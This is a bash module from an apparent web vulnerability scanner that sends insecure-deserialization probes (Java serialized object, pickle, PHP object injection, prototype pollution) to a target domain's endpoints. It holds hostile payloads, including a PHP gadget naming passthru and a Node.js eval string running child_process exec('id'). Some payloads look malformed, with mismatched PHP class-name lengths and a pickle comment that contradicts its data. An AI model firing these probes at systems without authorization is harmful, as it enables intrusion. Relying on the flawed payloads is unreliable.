#!/usr/bin/env bash

source "$(dirname "${BASH_SOURCE[0]}")/../lib/logger.sh"
source "$(dirname "${BASH_SOURCE[0]}")/../lib/utils.sh"

DESER_VULN_COUNT=0

# ─── Deserialization Main Entry ──────────────────────────────────────────────

scan_deserialization() {
    local domain=$1
    echo "=== INSECURE DESERIALIZATION DETECTION ==="
    log_info "Starting deserialization scanning on $domain"

    deser_java_magic_bytes "$domain"
    deser_python_pickle "$domain"
    deser_php_object_injection "$domain"
    deser_nodejs_unsafe "$domain"
    deser_gadget_chains "$domain"

    echo "Deserialization checks completed. Potential findings: $DESER_VULN_COUNT"
    echo ""
}

# ─── Java Serialization Magic Byte Detection ────────────────────────────────

deser_java_magic_bytes() {
    local domain=$1
    echo "--- Java Serialization Magic Byte Detection ---"

    # Java serialized objects start with magic bytes AC ED 00 05
    # Base64-encoded: rO0AB
    local java_magic_b64="rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYcec4fAwAHSQAIaGFzaENvZGVJAAhob3N0SGFzaEkACHVzZXJJbmZvTAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAXQAAXQAAXQAAXQAAXh4"

    local endpoints=(
        "https://$domain/api/deserialize"
        "https://$domain/api/object"
        "https://$domain/api/session"
        "https://$domain/readObject"
        "https://$domain/api/v1/deserialize"
    )

    for url in "${endpoints[@]}"; do
        local status
        status=$(get_http_status "$url")
        if [[ "$status" =~ ^[2-4][0-9]{2}$ && "$status" != "404" ]]; then
            # Decode the probe payload; skip if decode fails
            local decoded_payload
            decoded_payload=$(echo "$java_magic_b64" | base64 -d 2>/dev/null) || {
                log_debug "base64 decode failed for Java serialization probe; skipping $url"
                continue
            }
            # Send Java serialized payload
            local response
            response=$(curl -s -m 10 -X POST "$url" \
                -H "Content-Type: application/octet-stream" \
                -H "User-Agent: AWJUNAID/2.0" \
                --data-binary "$decoded_payload" \
                2>/dev/null || true)

            if echo "$response" | grep -qiE "ClassNotFoundException|InvalidClassException|deserializ|java\.lang\.|java\.util\.|exception"; then
                echo "⚠️  [HIGH] Java deserialization endpoint detected: $url"
                echo "    Magic bytes ACED0005 accepted by server"
                echo "    CWE-502 | CVSS: 9.8 (Critical)"
                echo "    Remediation: Avoid Java deserialization of untrusted data; use JSON/XML"
                ((DESER_VULN_COUNT++))
            fi
        fi
    done
    echo ""
}

# ─── Python Pickle Detection ─────────────────────────────────────────────────

deser_python_pickle() {
    local domain=$1
    echo "--- Python Pickle Unsafe Parsing Detection ---"

    # Pickle opcode: \x80\x02 (protocol 2 marker)
    # Safe probe: a pickle that resolves to a harmless string
    local pickle_b64
    # cos\nsystem\n(S'id'\ntR. - executes 'id'; for detection we just probe the endpoint
    pickle_b64="gASVIAAAAAAAAACMCGJ1aWx0aW5zlIwEcmVwcpSTlIwDc3RylIWUUpQu"

    local endpoints=(
        "https://$domain/api/pickle"
        "https://$domain/api/load"
        "https://$domain/api/model"
        "https://$domain/api/v1/data"
        "https://$domain/predict"
        "https://$domain/api/ml"
    )

    for url in "${endpoints[@]}"; do
        local response
        response=$(curl -s -m 10 -X POST "$url" \
            -H "Content-Type: application/octet-stream" \
            -H "User-Agent: AWJUNAID/2.0" \
            --data-binary "$(echo "$pickle_b64" | base64 -d 2>/dev/null || echo "")" \
            2>/dev/null || true)

        if echo "$response" | grep -qiE "pickle|unpickl|__reduce__|module|_reconstruct"; then
            echo "⚠️  [CRITICAL] Python pickle deserialization detected: $url"
            echo "    CWE-502 | CVSS: 9.8 (Critical)"
            echo "    Remediation: Replace pickle with safe alternatives (json, msgpack)"
            ((DESER_VULN_COUNT++))
        fi
    done
    echo ""
}

# ─── PHP Object Injection ─────────────────────────────────────────────────────

deser_php_object_injection() {
    local domain=$1
    echo "--- PHP Serialization Object Injection ---"

    local php_payloads=(
        'O:8:"stdClass":1:{s:4:"test";s:3:"xxe";}'
        'a:2:{i:0;s:4:"test";i:1;O:8:"stdClass":0:{}}'
        'O:8:"Monolog\Handler\SyslogUdpHandler":1:{s:9:"\x00*\x00socket";O:29:"Guzzle\Http\Message\FunctionSend":1:{s:4:"func";s:10:"passthru";}}'
    )

    local endpoints=(
        "https://$domain/api/user"
        "https://$domain/api/session"
        "https://$domain/api/data"
        "https://$domain/api/load"
        "https://$domain/unserialize"
    )

    for payload in "${php_payloads[@]}"; do
        for url in "${endpoints[@]}"; do
            local response
            response=$(curl -s -m 10 -X POST "$url" \
                -H "Content-Type: application/x-www-form-urlencoded" \
                -H "User-Agent: AWJUNAID/2.0" \
                --data-urlencode "data=$payload" \
                2>/dev/null || true)

            if echo "$response" | grep -qiE "__wakeup|__destruct|unserializ|stdClass|fatal error"; then
                echo "⚠️  [CRITICAL] PHP object injection vulnerability: $url"
                echo "    CWE-502 | CVSS: 9.8 (Critical)"
                echo "    Remediation: Avoid unserialize() on user input; use JSON"
                ((DESER_VULN_COUNT++))
            fi
        done
    done
    echo ""
}

# ─── Node.js Unsafe eval / Prototype Pollution ──────────────────────────────

deser_nodejs_unsafe() {
    local domain=$1
    echo "--- Node.js Unsafe eval and Prototype Pollution ---"

    # Prototype pollution payloads
    local proto_payloads=(
        '{"__proto__":{"isAdmin":true}}'
        '{"constructor":{"prototype":{"isAdmin":true}}}'
        '{"__proto__.isAdmin":true}'
    )

    # Unsafe eval payloads (look for reflection in response)
    local eval_payloads=(
        '{"data":"require(\"child_process\").exec(\"id\")"}'
        '{"fn":"eval","args":["1+1"]}'
    )

    local json_endpoints=(
        "https://$domain/api/v1/user"
        "https://$domain/api/config"
        "https://$domain/api/merge"
        "https://$domain/api/extend"
    )

    for payload in "${proto_payloads[@]}" "${eval_payloads[@]}"; do
        for url in "${json_endpoints[@]}"; do
            local response
            response=$(curl -s -m 10 -X POST "$url" \
                -H "Content-Type: application/json" \
                -H "User-Agent: AWJUNAID/2.0" \
                -d "$payload" 2>/dev/null || true)

            if echo "$response" | grep -qiE '"isAdmin":true|ReferenceError|EvalError|SyntaxError.*eval'; then
                echo "⚠️  [HIGH] Prototype pollution or unsafe eval detected: $url"
                echo "    Payload: $payload"
                echo "    CWE-1321 | CVSS: 8.1 (High)"
                echo "    Remediation: Sanitize object merge operations; avoid eval()"
                ((DESER_VULN_COUNT++))
            fi
        done
    done
    echo ""
}

# ─── Common Gadget Chain Identification ──────────────────────────────────────

deser_gadget_chains() {
    local domain=$1
    echo "--- Common Gadget Chain Identification ---"

    # Known gadget chain fingerprints in response headers/bodies
    local gadget_indicators=(
        "CommonsCollections"
        "InvokerTransformer"
        "org.springframework"
        "com.sun.org.apache.xalan"
        "com.rometools.rome"
        "com.thoughtworks.xstream"
        "org.apache.commons"
        "java.lang.Runtime"
    )

    local endpoints=(
        "https://$domain/api"
        "https://$domain/"
        "https://$domain/actuator"
        "https://$domain/api/v1"
    )

    echo "Checking for gadget chain indicators in responses..."
    for url in "${endpoints[@]}"; do
        local response
        response=$(curl -s -m 10 "$url" \
            -H "User-Agent: AWJUNAID/2.0" \
            2>/dev/null || true)

        for indicator in "${gadget_indicators[@]}"; do
            if echo "$response" | grep -q "$indicator"; then
                echo "⚠️  [HIGH] Gadget chain class detected in response: $url"
                echo "    Indicator: $indicator"
                echo "    CWE-502 | CVSS: 9.0 (Critical)"
                ((DESER_VULN_COUNT++))
            fi
        done
    done

    echo ""
}
